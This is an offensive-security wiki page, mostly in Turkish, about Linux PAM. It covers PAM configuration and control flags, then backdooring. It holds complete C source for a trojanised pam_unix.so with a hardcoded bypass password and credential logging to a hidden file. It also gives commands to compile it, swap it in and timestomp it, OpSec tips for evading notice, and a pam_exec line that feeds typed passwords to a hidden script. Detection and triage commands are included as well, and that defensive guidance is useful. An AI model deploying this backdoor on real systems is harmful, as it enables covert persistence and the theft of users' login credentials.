# PAM - Takılabilir Kimlik Doğrulama Modülleri

{{#include ../../banners/hacktricks-training.md}}

### Temel Bilgiler

**PAM (Takılabilir Kimlik Doğrulama Modülleri)**, **bilgisayar hizmetlerine erişmeye çalışan kullanıcıların kimliğini doğrulayan** ve erişimlerini çeşitli kriterlere göre kontrol eden bir güvenlik mekanizmasıdır. Yalnızca yetkili kullanıcıların belirli hizmetlerle etkileşime girebilmesini sağlarken, sistemin aşırı yüklenmesini önlemek için kullanımlarını potansiyel olarak sınırlayan dijital bir bekçi gibidir.

#### Yapılandırma Dosyaları

- **Solaris ve UNIX tabanlı sistemler** genellikle `/etc/pam.conf` konumunda bulunan merkezi bir yapılandırma dosyası kullanır.
- **Linux sistemleri** ise dizin yaklaşımını tercih eder ve hizmete özel yapılandırmaları `/etc/pam.d` içinde depolar. Örneğin, login hizmetinin yapılandırma dosyası `/etc/pam.d/login` konumunda bulunur.<sup>[[1]](#references)</sup>

login hizmeti için bir PAM yapılandırması örneği şu şekilde görünebilir:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Bu realm'ler veya yönetim grupları, authentication ve session management sürecinin farklı yönlerinden sorumlu olan **auth**, **account**, **password** ve **session** bileşenlerini içerir:<sup>[[1]](#references)</sup>

- **Auth**: Genellikle bir password isteyerek kullanıcının kimliğini doğrular.
- **Account**: Grup üyeliği veya günün belirli saatlerine yönelik kısıtlamalar gibi koşulları kontrol ederek account doğrulamasını gerçekleştirir.
- **Password**: Complexity kontrolleri veya dictionary attacks prevention dahil olmak üzere password güncellemelerini yönetir.
- **Session**: Directory'leri mount etmek veya resource limit'leri ayarlamak gibi bir service session'ının başlangıcında ya da sonunda gerçekleştirilen işlemleri yönetir.

#### **PAM Module Controls**

Controls, module'ün success veya failure durumundaki tepkisini belirleyerek genel authentication sürecini etkiler. Bunlar şunlardır:<sup>[[1]](#references)</sup>

- **Required**: Required bir module'ün failure vermesi, ancak sonraki tüm module'ler kontrol edildikten sonra eventual failure ile sonuçlanır.
- **Requisite**: Failure durumunda sürecin anında sonlandırılmasını sağlar.
- **Sufficient**: Success, sonraki bir module failure vermediği sürece aynı realm'in geri kalan kontrollerini bypass eder.
- **Optional**: Yalnızca stack'teki tek module olması durumunda failure'a neden olur.

#### Offensive Semantics That Matter

PAM backdoor'lanırken **eklenen rule'un konumu** çoğu zaman payload'ın kendisinden daha önemlidir:

- `include` ve `substack`, rule'ları diğer file'lardan çeker; bu nedenle `sshd`'yi düzenlemek yalnızca SSH'yi etkileyebilirken `system-auth`, `common-auth` veya başka bir paylaşılan stack'i düzenlemek aynı anda birkaç service'i etkileyebilir.
- PAM ayrıca `[success=1 default=ignore]` gibi köşeli parantez içindeki control'leri destekler. Bunlar, `pam_unix.so`'yu görünür şekilde değiştirmek yerine başarılı bir custom check sonrasında bir veya daha fazla module'ü **atlamak** için abuse edilebilir.
- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) veya varsayılan PAM module directory'sine göre **relative** olabilir. Modern Linux sistemlerinde gerçek directory'ler çoğunlukla `/lib/security`, `/lib64/security`, `/usr/lib/security` veya `/usr/lib/x86_64-linux-gnu/security` gibi multiarch path'lerdir.

Quick operator takeaway: patching işleminden önce her zaman **full service graph**'ı çıkarın. Örneğin bazı distro'larda `sshd -> password-auth -> system-auth`, diğerlerinde ise `sshd -> system-remote-login -> system-login -> system-auth` bulunması, aynı one-line implant'ın amaçlanandan çok daha geniş bir alana yayılabileceği anlamına gelir.

#### Example Scenario

Birden fazla auth module'ünün bulunduğu bir setup'ta process katı bir sıra izler. `pam_securetty` module'ü login terminal'ının yetkisiz olduğunu tespit ederse root login'leri engellenir; ancak "required" status'ü nedeniyle tüm module'ler yine de işlenir. `pam_env`, environment variable'larını ayarlayarak potansiyel olarak user experience'ı iyileştirir. `pam_ldap` ve `pam_unix` module'leri, kullanıcıyı authenticate etmek için birlikte çalışır; `pam_unix`, daha önce sağlanmış bir password'ü kullanmayı deneyerek authentication method'larında verimliliği ve esnekliği artırır.


## Backdooring PAM – Hooking `pam_unix.so`

High-value Linux environment'larında kullanılan klasik bir persistence trick'i, **legitimate PAM library'yi trojanised bir drop-in ile değiştirmektir**. Her SSH / console login işlemi `pam_unix.so:pam_sm_authenticate()` çağrısını gerçekleştirdiğinden, credential'ları capture etmek veya *magic* password bypass uygulamak için birkaç satır C kodu yeterlidir.<sup>[[2]](#references)</sup>

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Derleyin ve gizlice değiştirin:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec İpuçları
1. **Atomic overwrite** – yarısı yazılmış ve SSH erişimini kilitleyebilecek library dosyalarını önlemek için geçici bir dosyaya yazın ve ardından `mv` ile yerine taşıyın.
2. `/usr/bin/.dbus.log` gibi log file konumları, meşru desktop artefact'larıyla uyum sağlar.
3. PAM hatalı davranışlarını önlemek için symbol export'larını (`pam_sm_setcred` vb.) aynı tutun.

### Tespit
* `pam_unix.so` için MD5/SHA256 değerini distro package ile karşılaştırın.
* Manuel hashing yapmadan değiştirilmiş library'leri tespit etmek için `rpm -V pam` veya `debsums -s libpam-modules` kullanın.
* `/lib/security/` altında world-writable veya alışılmadık ownership olup olmadığını kontrol edin.
* `auditd` kuralı: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Beklenmeyen module'leri bulmak için PAM config'lerini tarayın: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise veya threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Persistence için `pam_exec` Abuse
`pam_unix.so`'yu değiştirmek yerine, normal stack'i olduğu gibi bırakırken her SSH login'inde bir implant başlatmak için `/etc/pam.d/sshd` dosyasına bir `pam_exec` satırı eklemek daha hafif bir yaklaşımdır:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`, `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` ve `PAM_TYPE` gibi PAM metadata bilgilerini environment variables olarak alır. `expose_authtok` ile helper, `auth` veya `password` aşamalarında parolayı `stdin` üzerinden de okuyabilir. Helper'ın real UID yerine effective UID ile çalışmasını istiyorsanız `seteuid` ekleyin.

Pratik notlar:

- `session optional pam_exec.so ...`, socket'leri yeniden açmak veya detached bir daemon başlatmak gibi **post-login actions** için daha uygundur.
- `auth optional pam_exec.so quiet expose_authtok ...`, session açılmadan önce çalıştığı için genellikle **credential capture** amacıyla tercih edilir.
- `type=session` veya `type=auth`, çalıştırmayı belirli bir PAM aşamasıyla sınırlandırmak ve gürültülü double execution'ı önlemek için kullanılabilir.

### Distro tooling'den kurtulma: `authselect`

RHEL, CentOS Stream, Fedora ve türevi sistemlerde `/etc/pam.d/system-auth` veya `/etc/pam.d/password-auth` gibi generate edilen dosyalarda doğrudan yapılan değişiklikler **`authselect` tarafından üzerine yazılabilir**. Kalıcılık için operatörler genellikle `/etc/authselect/custom/<profile>/` altındaki aktif custom profile'ı patch eder ve ardından bu profile'ı yeniden seçer veya uygular.

Root erişiminiz olduğunda tipik workflow:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Bu, hem saldırı hem de triage açısından önemlidir: `/etc/pam.d/system-auth` dosyası `Generated by authselect` ve `Do not modify this file manually` banner'larını içeriyorsa, gerçek persistence noktası `/etc/pam.d/` yerine `/etc/authselect/custom/` altında olabilir.

### Sahada gözlemlenen güncel tradecraft

2025'te **Plague** Linux backdoor'u hakkında yayımlanan raporlar, aynı temel fikrin daha ileri bir biçimini gösterdi: **static bypass password** içeren kötü amaçlı bir PAM bileşeni ve login sonrasında session izlerini azaltmak için SSH ile ilgili environment variable'ların ve shell history'nin (`HISTFILE=/dev/null`) temizlenmesi.<sup>[[3]](#references)</sup> Bu, değerli bir hunting pattern'idir; çünkü backdoor logic PAM içinde bulunurken stealth artifacts yalnızca authentication başarılı olduktan **sonra** ortaya çıkabilir.


## Referanslar

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
